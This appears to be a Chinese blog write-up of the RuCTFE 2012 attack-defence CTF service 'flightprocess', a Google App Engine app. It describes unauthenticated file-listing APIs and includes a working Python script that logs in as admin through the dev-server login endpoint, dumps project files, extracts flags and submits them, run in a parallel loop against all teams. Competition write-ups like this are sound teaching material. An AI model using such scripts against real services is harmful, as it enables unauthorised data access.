---
title: '[RuCTFE2012]flightprocess'
author: yzm
layout: post
permalink: /ructfe2012_flightprocess/
categories:
  - Uncategorized
tags:
  - RuCTFE
---
flightprocess是一个基于Google App Engine的应用

拿到程序以后现在本地搭建了一个GAE的SDK环境，然后在本地运行了起来

大致看了看这个程序，是一个在线编辑交通图的IDE。所有文件（交通图用XML表示，还有其他图片什么的）都丢在数据库里。

杨坤在data文件里找到了明文的KEY。而且，KEY好像是保存在XML中，把这段明文复制出来，放在前端的IDE里面，正好是一张交通图。

然后我就猜想，KEY在某个交通图里，这个交通图在某个工程里面，然后这个工程又是公开的，所有人都能读取。

后来在GAE的调试模式下面的确验证了我的猜想。注意XML文件也当做是二进制文件保存了，GAE的后台无法直接看到这个KEY。

并且从梁校长那里看到的流量中，看到了比赛组织者推送KEY的过程

之后杨坤和俞则明联手从javascript里找到了拿到KEY的api

然后杨坤就开始从前台开始分析这个IDE，发现全都是JavaScript动态生成的。

找到几个API：  
列某个工程下的所有文件，  
/api/files/list/[工程名称]/

读取某个工程下的某个文件，  
/api/files/browse/[工程名称]/[文件名称]

列所有工程，  
/api/projects/list

查找工程  
/api/projects/find

除了列所有工程做了用户权限检查，其他的API都没有做用户权限检查，也就是说，任何用户都能看到所有工程的所有文件。  
并且查找工程是返回所有工程名字然后在前端查找的。

然后就是自动化的事情了.

我使用Python的cookielib登录，先拿到所有的project list，然后通过json解析把其它的信息取得，最后使用正则把KEY匹配出来，并且自动进行telnet提交到裁判

宋教授建议我把python脚本做成单参数的，然后他使用xargs进行并行处理，while 1;把所有队的跑一遍

这次主要的时间浪费在搞清比赛规则上，例如完全不知道KEY是啥时候推过来。其实漏洞倒不是特别难，但是如果没有GAE的经验的话，会无从下手。我一开始打算一点点看代码，但是太累了，幸好俞使用了前端调试，很快就找到了。

代码如下

    import urllib2
    import urllib
    import cookielib
    import json
    import sys
    import re
    
    ips = [sys.argv[-1]]
    
    for i in ips:
        cookieJar = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookieJar))
        #print i
        f = opener.open("http://"+i+":10800/_ah/login?email=test%40example.com&amp;admin=True&amp;action=Login&amp;continue=")
        #print f.read()
    
        f = opener.open("http://%s:10800/api/projects/find"%i)
        a = f.read()
        #print a
    
    
        b = json.loads(a)
        c =  b['data'][-1]['link_name']
    
        f = opener.open("http://"+i+":10800/api/files/list/"+c+"/")
        d = f.read()
    
        e = json.loads(d)
        g =  e['data'][0]['name']
    
        f = opener.open("http://"+i+":10800/api/files/browse/%s/%s.fpml"%(c,g))
        pattern = r"\w{31}="
        nn = re.findall(pattern,f.read())[-1]
        print nn
        import telnetlib
        tn = telnetlib.Telnet('flags.e.ructf.org',10001)
        tn.read_until("Enter your flags,")
        tn.write(nn+'\n')
        tn.close()
    

执行的Bash命令是

    while :;do  xargs -P50 -i python do.py.bak '{}'  output;done